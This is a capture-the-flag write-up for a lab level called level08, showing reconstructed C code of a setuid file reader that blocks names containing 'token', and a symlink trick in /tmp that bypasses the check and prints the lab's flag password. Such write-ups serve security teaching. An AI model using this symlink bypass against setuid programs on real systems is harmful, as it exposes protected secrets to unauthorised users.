## level08

There is an unreadable token file and a `level08` executable with the setuid bit set. We disassembled the binary and came up with this approximate C code:

```c
#define BUF_SIZE 1024

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("%s [file to read]\n", argv[0]);
        exit(1);
    }
    if (strstr(argv[1], "token")) {
        printf("You may not access '%s'\n", argv[1]);
        exit(1);
    }
    int fd = open(argv[1], O_RDONLY);
    if (fd == -1) {
        err(1, "Unable to open %s", argv[1]);
    }
    char buf[BUF_SIZE];
    ssize_t bytesRead = read(fd, buf, BUF_SIZE);
    if (bytesRead == -1) {
        err(1, "Unable to read fd %d", fd);
    }
    write(1, buf, bytesRead);
    return 0;
}
```

The program displays the first 1024 characters of the file given as argument, but refuses to read the `token` file. However, the only protection is a `strstr` with `"token"`, so we can easily bypass it with a symbolic link, giving us the password for flag08.

```shell
$ ln -s /home/user/level08/token /tmp/link
$ ./level08 /tmp/link # quif5eloekouj29ke0vouxean
```
